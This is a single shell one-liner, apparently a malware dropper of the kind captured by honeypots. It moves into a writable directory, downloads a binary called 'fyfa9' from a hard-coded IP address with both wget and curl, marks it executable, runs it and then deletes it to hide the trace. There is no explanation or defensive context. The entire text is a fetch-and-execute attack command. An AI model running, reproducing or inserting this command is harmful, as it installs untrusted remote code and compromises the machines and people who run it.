cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://173.0.52.188/fyfa9; curl -O http://173.0.52.188/fyfa9; chmod +x fyfa9; ./fyfa9; rm -rf fyfa9
